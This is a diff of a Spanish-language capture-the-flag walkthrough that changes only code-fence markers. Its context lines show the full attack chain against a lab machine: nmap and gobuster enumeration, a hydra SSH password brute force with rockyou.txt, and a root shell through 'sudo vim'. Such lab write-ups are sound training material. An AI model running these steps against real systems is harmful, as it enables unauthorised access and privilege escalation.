@@ -38,7 +38,7 @@ Se confirmó que el objetivo responde a la red.
 
 ### 2. Escaneo completo de puertos con Nmap
 
-\`\`\`bash
+\`\`\`
 nmap -sV -sC -p- 172.18.0.2 --open -oN scanPuertos.txt
 \`\`\`
 
@@ -55,7 +55,7 @@ Vemos que tiene el puerto 80 mediante el navegador
 
 ### 3. Enumeración de directorios HTTP con Gobuster
 
-\`\`\`bash
+\`\`\`
 gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://172.18.0.2 -x php,html,xml,txt,json
 \`\`\`
 
@@ -77,7 +77,7 @@ Al visitar \`http://172.18.0.2/secret.php\` encontramos un nombre: **Mario**.
 
 Intentamos acceder vía SSH con el usuario \`mario\` usando el diccionario \`rockyou.txt\`:
 
-\`\`\`bash
+\`\`\`
 hydra -l mario -P /usr/share/wordlists/rockyou.txt -v ssh://172.18.0.2
 \`\`\`
 
@@ -99,7 +99,7 @@ Conectamos exitosamente a la máquina como usuario \`mario\`.
 
 Ejecutamos:
 
-\`\`\`bash
+\`\`\`
 sudo -l
 \`\`\`
 
@@ -115,7 +115,7 @@ Usando la técnica encontrada en [GTFOBins - Vim](https://gtfobins.github.io/), 
 
 ![escalada](screenshots/escaladavim.PNG)
 
-\`\`\`bash
+\`\`\`
 sudo vim -c ':!/bin/sh'
 \`\`\`
 
